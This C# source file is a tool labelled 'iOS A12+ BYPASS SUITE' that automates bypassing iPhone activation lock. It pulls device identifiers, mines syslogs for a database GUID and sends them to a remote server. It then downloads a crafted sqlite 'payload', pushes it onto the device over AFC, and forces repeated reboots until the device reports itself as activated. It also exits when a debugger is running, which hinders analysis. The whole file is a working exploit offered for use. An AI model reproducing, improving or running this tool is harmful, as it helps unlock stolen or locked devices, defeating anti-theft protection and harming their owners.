using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace DeviceBypassSuite
{
    class Program
    {
        // Configuration Constants
        // API GOES HERE
        private const string REMOTE_SVC_URI = "https://example.com/index.php";
        private const int ASSET_GEN_TIMEOUT_SEC = 300;
        private const int CLEANUP_DELAY_SEC = 15;
        
        // State Variables
        private static string _mountDirectory;
        private static string _transferMethod = "native"; // native (pymobiledevice3) or mounted (ifuse)
        private static readonly HttpClient _netClient = new HttpClient();
        
        // Device Identity
        private static string _deviceUdid;
        private static string _deviceSerial;
        private static string _deviceModel;
        private static string _osVersion;

        static async Task Main(string[] args)
        {
            InitializeInterface();

            try
            {
                // 1. Integrity and Environment Checks
                PerformSecurityScan();
                ValidateDependencies();

                // 2. Hardware Handshake
                AcquireDeviceMetrics();

                Console.WriteLine("\n[!] Ready to initialize sequence. Press Enter to proceed...");
                Console.ReadLine();

                // 3. Execution Phase
                await RunBypassSequence();
            }
            catch (Exception ex)
            {
                Logger.Critical($"Fatal Runtime Error: {ex.Message}");
                Environment.Exit(1);
            }
            finally
            {
                DismountFilesystem();
            }
        }

        private static async Task RunBypassSequence()
        {
            // Phase 1: Initial Reset
            Logger.Section("Phase 1: Initial State Reset");
            if (!ExecuteDeviceRestart()) throw new Exception("Primary reboot failed.");
            WaitForConnection(120);

            // Phase 2: Log Mining
            Logger.Section("Phase 2: System Log Aggregation");
            string logPath = $"{_deviceUdid}.logarchive";
            bool liveScanNeeded = false;

            if (!CaptureSystemLogs(logPath))
            {
                Logger.Warn("Archive retrieval failed. Switching to real-time stream analysis.");
                liveScanNeeded = true;
            }

            // Phase 3: Identity Token Extraction
            Logger.Section("Phase 3: Identity Analysis");
            string identityToken = liveScanNeeded ? AnalyzeLiveLogs() : AnalyzeLogArchive(logPath);

            if (string.IsNullOrEmpty(identityToken))
                throw new Exception("Unable to isolate identity token (GUID) from logs.");

            Logger.Success($"Token Isolate: {identityToken}");

            // Phase 4: Server Handshake
            Logger.Section("Phase 4: Remote Authorization");
            string payloadUrl = await RequestPayloadUrl(_deviceModel, identityToken, _deviceSerial);

            // Phase 5: Payload Acquisition
            Logger.Section("Phase 5: Payload Acquisition");
            string localDbFile = "downloads.28.sqlitedb";
            await DownloadPayload(payloadUrl, localDbFile);

            // Verify Storage
            VerifyStorageCapacity();

            // Phase 6: Prerequisite Cleanup
            Logger.Section("Phase 6: Artifact Sanitation");
            RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb");
            RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb-shm");
            RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb-wal");

            // Phase 7: Injection
            Logger.Section("Phase 7: Data Injection");
            Thread.Sleep(10000); // Stabilization buffer
            InjectPayload(localDbFile, "/Downloads/downloads.28.sqlitedb");
            File.Delete(localDbFile); // Clean local

            // Phase 8: Post-Injection Reboot
            Logger.Section("Phase 8: Implementation Reboot");
            if (!ExecuteDeviceRestart()) throw new Exception("Implementation reboot failed.");
            WaitForConnection(300);

            // Phase 9: Metadata Validation
            Logger.Section("Phase 9: Metadata Integrity Check");
            WaitForFileExistence("/iTunes_Control/iTunes/iTunesMetadata.plist", 20);

            // Phase 10: Secondary Reboot
            Logger.Section("Phase 10: Secondary Reboot");
            if (!ExecuteDeviceRestart()) throw new Exception("Secondary reboot failed.");
            WaitForConnection(300);

            // Phase 11: Trigger Monitoring
            Logger.Section("Phase 11: Trigger Event Monitoring");
            if (WaitForTriggerFile())
            {
                Logger.Info("Trigger event detected. Monitoring metadata decay...");
                
                // Wait for metadata purge
                MonitorFileDecay("/iTunes_Control/iTunes/iTunesMetadata.plist", 300);
                
                Thread.Sleep(CLEANUP_DELAY_SEC * 1000);
                RemoveDeviceArtifacts("/Books/asset.epub");

                // Cleanup Downloads
                Logger.Section("Phase 12: Final Sanitation");
                RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb");
                RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb-shm");
                RemoveDeviceArtifacts("/Downloads/downloads.28.sqlitedb-wal");

                // Final Reboot
                Logger.Section("Phase 13: Finalizing Reboot");
                ExecuteDeviceRestart();
                WaitForConnection(300);

                // Validation
                CheckActivationStatus(120);
            }
            else
            {
                // Recovery Path
                Logger.Warn("Trigger timeout. Entering recovery sequence.");
                ExecuteDeviceRestart();
                WaitForConnection(300);
                
                // Final Check on Recovery
                CheckActivationStatus(30);
            }
        }

        // ---------------------------------------------------------
        // Core Logic Methods
        // ---------------------------------------------------------

        private static void PerformSecurityScan()
        {
            var debuggers = new[] { "gdb", "lldb" };
            var processList = Process.GetProcesses();
            
            if (processList.Any(p => debuggers.Contains(p.ProcessName)))
            {
                Logger.Critical("Hostile monitoring environment detected.");
                Environment.Exit(9);
            }

            var env = Environment.GetEnvironmentVariables();
            if (env.Contains("HTTP_PROXY") || env.Contains("HTTPS_PROXY"))
            {
                Logger.Warn("Traffic interception (Proxy) detected.");
            }
        }

        private static void ValidateDependencies()
        {
            Logger.Header("Dependency Verification");
            CheckBinary("ideviceinfo");
            CheckBinary("pymobiledevice3");
            CheckBinary("curl");

            // Determine Transfer Strategy
            if (Shell.CommandExists("ifuse"))
            {
                _transferMethod = "mounted";
                _mountDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), $".ios_mount_{Process.GetCurrentProcess().Id}");
            }
            else
            {
                _transferMethod = "native";
            }
            Logger.Info($"Filesystem Strategy: {_transferMethod}");
        }

        private static void AcquireDeviceMetrics()
        {
            Logger.Header("Hardware Identification");
            
            string output = Shell.Execute("ideviceinfo");
            if (string.IsNullOrWhiteSpace(output))
            {
                throw new Exception("Hardware unavailable. Check USB connection.");
            }

            var lines = output.Split('\n');
            _deviceUdid = ExtractValue(lines, "UniqueDeviceID");
            _deviceModel = ExtractValue(lines, "ProductType");
            _deviceSerial = ExtractValue(lines, "SerialNumber");
            _osVersion = ExtractValue(lines, "ProductVersion");
            string status = ExtractValue(lines, "ActivationState");

            Console.WriteLine($"  Model:   {_deviceModel}");
            Console.WriteLine($"  iOS:     {_osVersion}");
            Console.WriteLine($"  UDID:    {_deviceUdid}");
            Console.WriteLine($"  State:   {status}");

            if (status == "Activated")
            {
                Logger.Warn("Target is already in active state.");
                Console.Write("  Proceed regardless? [y/N]: ");
                if (Console.ReadKey().Key != ConsoleKey.Y) Environment.Exit(0);
                Console.WriteLine();
            }
        }

        private static bool CaptureSystemLogs(string destination)
        {
            Logger.Detail("Initiating log capture protocols...");
            if (Directory.Exists(destination)) Directory.Delete(destination, true);

            // Attempt capture with timeout
            try
            {
                // Using a process with timeout logic
                using (var p = new Process())
                {
                    p.StartInfo.FileName = "pymobiledevice3";
                    p.StartInfo.Arguments = $"syslog collect \"{destination}\"";
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.Start();
                    
                    if (!p.WaitForExit(180000)) // 3 minutes
                    {
                        try { p.Kill(); } catch { }
                        Logger.Warn("Log capture timed out.");
                    }
                }
            }
            catch 
            {
                return false;
            }

            return Directory.Exists(destination);
        }

        private static string AnalyzeLogArchive(string archivePath)
        {
            string tempArchive = "temp_analysis.logarchive";
            if (Directory.Exists(tempArchive)) Directory.Delete(tempArchive, true);
            Directory.Move(archivePath, tempArchive);

            Logger.Detail("Parsing binary logs...");
            
            // Constructing the complex predicate command
            string cmd = $"log show --info --debug --style syslog --predicate 'eventMessage CONTAINS \"/private/var/containers/Shared/SystemGroup/\"' --archive \"{tempArchive}\"";
            
            // We run this via bash to handle the piping if needed, or direct execution
            string result = Shell.Execute("/bin/bash", $"-c \"{cmd}\"");
            
            // Cleanup
            try { Directory.Delete(tempArchive, true); } catch { }

            return RegexScanForGuid(result);
        }

        private static string AnalyzeLiveLogs()
        {
            Logger.Detail("Streaming live telemetry...");
            // Start a background read
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "pymobiledevice3",
                    Arguments = "syslog watch",
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                }
            };
            
            proc.Start();
            
            string foundGuid = null;
            var stopwatch = Stopwatch.StartNew();

            while (stopwatch.Elapsed.TotalSeconds < 120 && foundGuid == null)
            {
                string line = proc.StandardOutput.ReadLine();
                if (line != null)
                {
                    foundGuid = RegexScanForGuid(line);
                }
            }

            try { proc.Kill(); } catch { }
            return foundGuid;
        }

        private static string RegexScanForGuid(string input)
        {
            if (string.IsNullOrEmpty(input)) return null;

            // Pattern matching the folder structure 8-4-4-4-12 UUID format
            string pattern = @"/private/var/containers/Shared/SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/Documents/BLDatabaseManager/BLDatabaseManager\.sqlite";
            
            var match = Regex.Match(input, pattern);
            if (match.Success)
            {
                return match.Groups[1].Value.ToUpper();
            }
            return null;
        }

        private static async Task<string> RequestPayloadUrl(string prd, string guid, string sn)
        {
            Logger.Detail($"Handshaking: {REMOTE_SVC_URI}");
            
            string fullUri = $"{REMOTE_SVC_URI}?prd={prd}&guid={guid}&sn={sn}";
            
            _netClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Compatible; ActivatorClient)");
            
            var response = await _netClient.GetAsync(fullUri);
            if (!response.IsSuccessStatusCode) throw new Exception($"Server refused connection: {response.StatusCode}");
            
            string body = (await response.Content.ReadAsStringAsync()).Trim();
            
            if (!Uri.IsWellFormedUriString(body, UriKind.Absolute))
                throw new Exception("Invalid payload descriptor received.");
                
            return body;
        }

        private static async Task DownloadPayload(string url, string outputPath)
        {
            Logger.Detail("Downloading payload...");
            var data = await _netClient.GetByteArrayAsync(url);
            if (data.Length < 100) throw new Exception("Payload corrupted (size too small).");
            
            await File.WriteAllBytesAsync(outputPath, data);
            Logger.Success($"Payload secured: {data.Length} bytes");
        }

        private static void VerifyStorageCapacity()
        {
            // Simple check using pymobiledevice3 shell
            string outStr = Shell.Execute("pymobiledevice3", "afc shell \"df /Downloads\"");
            // Simple parsing - logic assumes if command works, we check output manually or trust it
            if (string.IsNullOrEmpty(outStr)) Logger.Warn("Unable to verify remote storage quotas.");
        }

        private static void RemoveDeviceArtifacts(string remotePath)
        {
            if (_transferMethod == "mounted")
            {
                EnsureMounted();
                string fullPath = Path.Combine(_mountDirectory, remotePath.TrimStart('/'));
                if (File.Exists(fullPath)) File.Delete(fullPath);
            }
            else
            {
                Shell.Execute("pymobiledevice3", $"afc rm \"{remotePath}\"");
            }
        }

        private static void InjectPayload(string localPath, string remotePath)
        {
            if (_transferMethod == "mounted")
            {
                EnsureMounted();
                string target = Path.Combine(_mountDirectory, remotePath.TrimStart('/'));
                string targetDir = Path.GetDirectoryName(target);
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                
                File.Copy(localPath, target, true);
            }
            else
            {
                // Ensure directory exists via AFC
                string dir = Path.GetDirectoryName(remotePath).Replace("\\", "/");
                Shell.Execute("pymobiledevice3", $"afc mkdir \"{dir}\"");
                // Push
                Shell.Execute("pymobiledevice3", $"afc push \"{localPath}\" \"{remotePath}\"");
            }
            Logger.Success($"Injected -> {remotePath}");
        }

        private static bool ExecuteDeviceRestart()
        {
            string res = Shell.Execute("pymobiledevice3", "diagnostics restart");
            return !res.Contains("Error"); // Rough check
        }

        private static void WaitForConnection(int timeoutSeconds)
        {
            Console.Write("  Awaiting Link Re-establishment");
            var end = DateTime.Now.AddSeconds(timeoutSeconds);
            while (DateTime.Now < end)
            {
                string currentId = Shell.Execute("ideviceinfo", "-k UniqueDeviceID").Trim();
                if (currentId == _deviceUdid)
                {
                    Console.WriteLine(" [OK]");
                    return;
                }
                Console.Write(".");
                Thread.Sleep(3000);
            }
            throw new TimeoutException("Link negotiation timed out.");
        }

        private static bool WaitForTriggerFile()
        {
            int elapsed = 0;
            while (elapsed < ASSET_GEN_TIMEOUT_SEC)
            {
                if (CheckRemoteFileExists("/Books/asset.epub")) return true;
                
                // Also check flexible patterns if needed
                if (_transferMethod == "native")
                {
                    // grep check for native
                    string listing = Shell.Execute("pymobiledevice3", "afc ls /Books");
                    if (listing.Contains("asset") || listing.Contains(".epub")) return true;
                }
                
                Thread.Sleep(5000);
                elapsed += 5;
            }
            return false;
        }

        private static void MonitorFileDecay(string remotePath, int maxWait)
        {
            int elapsed = 0;
            while (elapsed < maxWait)
            {
                if (!CheckRemoteFileExists(remotePath)) return;
                Thread.Sleep(5000);
                elapsed += 5;
            }
        }

        private static bool CheckRemoteFileExists(string remotePath)
        {
            if (_transferMethod == "mounted")
            {
                EnsureMounted();
                return File.Exists(Path.Combine(_mountDirectory, remotePath.TrimStart('/')));
            }
            else
            {
                string dir = Path.GetDirectoryName(remotePath).Replace("\\", "/");
                string file = Path.GetFileName(remotePath);
                string list = Shell.Execute("pymobiledevice3", $"afc ls \"{dir}\"");
                return list.Split('\n').Any(l => l.Trim() == file);
            }
        }

        private static void CheckActivationStatus(int timeout)
        {
            var end = DateTime.Now.AddSeconds(timeout);
            while (DateTime.Now < end)
            {
                string state = Shell.Execute("ideviceinfo", "-k ActivationState").Trim();
                if (state == "Activated")
                {
                    Logger.Header("SUCCESS: DEVICE ACTIVATED");
                    return;
                }
                Thread.Sleep(5000);
            }
            Logger.Critical("Activation State could not be verified.");
        }

        private static void WaitForFileExistence(string path, int seconds)
        {
            int elapsed = 0;
            while (elapsed < seconds)
            {
                if (CheckRemoteFileExists(path)) return;
                Thread.Sleep(1000);
                elapsed++;
            }
            throw new Exception($"Required system file {path} failed to materialize.");
        }

        // ---------------------------------------------------------
        // Helpers (Mounting, Shell, String Parsing)
        // ---------------------------------------------------------

        private static void EnsureMounted()
        {
            if (_transferMethod != "mounted") return;
            if (Directory.Exists(_mountDirectory) && Directory.GetFiles(_mountDirectory).Length > 0) return;

            Directory.CreateDirectory(_mountDirectory);
            for (int i = 0; i < 5; i++)
            {
                Shell.Execute("ifuse", $"\"{_mountDirectory}\"");
                Thread.Sleep(1000);
                if (Directory.GetFiles(_mountDirectory).Length > 0) return;
            }
            throw new Exception("Filesystem mount failed.");
        }

        private static void DismountFilesystem()
        {
            if (_transferMethod == "mounted" && Directory.Exists(_mountDirectory))
            {
                Shell.Execute("umount", $"\"{_mountDirectory}\"");
                try { Directory.Delete(_mountDirectory); } catch { }
            }
        }

        private static void InitializeInterface()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("========================================");
            Console.WriteLine("      iOS A12+ BYPASS SUITE (C#)        ");
            Console.WriteLine("========================================");
            Console.ResetColor();
        }

        private static void CheckBinary(string bin)
        {
            string path = Shell.Execute("which", bin);
            Console.Write($"  Binary [{bin}]: ");
            if (string.IsNullOrWhiteSpace(path))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("MISSING");
                Console.ResetColor();
                Environment.Exit(1);
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("OK");
            Console.ResetColor();
        }

        private static string ExtractValue(string[] lines, string key)
        {
            var line = lines.FirstOrDefault(l => l.StartsWith(key));
            return line?.Split(new[] { ": " }, StringSplitOptions.None).LastOrDefault()?.Trim() ?? "";
        }
    }

    // ---------------------------------------------------------
    // Utility Classes
    // ---------------------------------------------------------

    public static class Shell
    {
        public static bool CommandExists(string cmd)
        {
            return !string.IsNullOrWhiteSpace(Execute("which", cmd));
        }

        public static string Execute(string fileName, string args = "")
        {
            try
            {
                var info = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true, // Absorb stderr
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(info))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();
                    return output.Trim();
                }
            }
            catch
            {
                return string.Empty;
            }
        }
    }

    public static class Logger
    {
        public static void Info(string msg) => Log(ConsoleColor.Cyan, "[i]", msg);
        public static void Success(string msg) => Log(ConsoleColor.Green, "[+]", msg);
        public static void Warn(string msg) => Log(ConsoleColor.Yellow, "[!]", msg);
        public static void Critical(string msg) => Log(ConsoleColor.Red, "[X]", msg);
        public static void Detail(string msg) => Log(ConsoleColor.DarkGray, " ->", msg);

        public static void Section(string title)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine($"=== {title} ===");
            Console.ResetColor();
        }

        public static void Header(string title)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"-- {title} --");
            Console.ResetColor();
        }

        private static void Log(ConsoleColor color, string prefix, string msg)
        {
            Console.ForegroundColor = color;
            Console.Write($"{prefix} ");
            Console.ResetColor();
            Console.WriteLine(msg);
        }
    }
}
